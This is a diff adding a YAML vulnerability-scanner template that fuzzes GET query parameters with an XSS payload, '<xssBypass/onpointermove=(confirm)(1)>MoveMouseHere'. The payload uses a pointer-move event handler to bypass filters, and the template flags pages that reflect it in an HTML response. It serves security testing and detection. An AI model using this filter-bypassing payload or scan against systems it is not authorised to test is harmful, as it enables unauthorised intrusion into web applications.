@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-bypass
+
+info:
+  name: Reflection XSS Detection with Bypassing On Pointer Move
+  author: netbaan
+  severity: medium
+  description: |
+    This template identifies reflection XSS vulnerabilities using a payload that manipulates mouse events.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Execute only on GET requests
+
+    payloads:
+      reflection:
+        - "<xssBypass/onpointermove=(confirm)(1)>MoveMouseHere"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
